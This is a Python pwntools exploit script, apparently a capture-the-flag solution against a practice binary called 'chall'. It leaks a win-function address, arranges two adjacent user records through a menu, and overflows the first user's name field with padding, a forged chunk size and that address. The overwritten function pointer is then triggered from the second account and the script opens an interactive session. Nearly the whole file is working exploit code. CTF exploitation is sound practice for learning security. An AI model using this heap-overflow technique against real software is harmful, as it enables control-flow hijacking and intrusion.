#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template a.out
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

# receive address of the win function
io.recvuntil(b"0x")
add = int(io.recvline()[:-1], 16)

# buffer overflow + chunk size data + desired return address
payload = b"A" * 20 + p64(0x31) + p64(add)

# Log out of root/original user
io.recvuntil(b"Exit")
io.sendline(b"3")

# create two new users immediately after another such that their chunks are stored adjacently
io.recvuntil(b"Exit")
io.sendline(b"2")

io.recvuntil(b"name")
io.sendline(b"Junk")

io.recvuntil(b"Exit")
io.sendline(b"2")

io.recvuntil(b"name")
io.sendline(b"Junk2")

# sign into the first user account
io.recvuntil(b"Exit")
io.sendline(b"1")

io.recvuntil(b"ID")
io.sendline(b"1")

# change the name of the first user
io.recvuntil(b"Exit")
io.sendline(b"1")

# exploit the buffer overflow to write data into second user chunk
io.recvuntil(b"to")
io.sendline(payload)

# log out of original users account
io.recvuntil(b"Exit")
io.sendline(b"3")

# sign into new user account to call changed function pointer
io.recvuntil(b"Exit")
io.sendline(b"1")

io.recvuntil(b"ID")
io.sendline(b"2")

io.interactive()

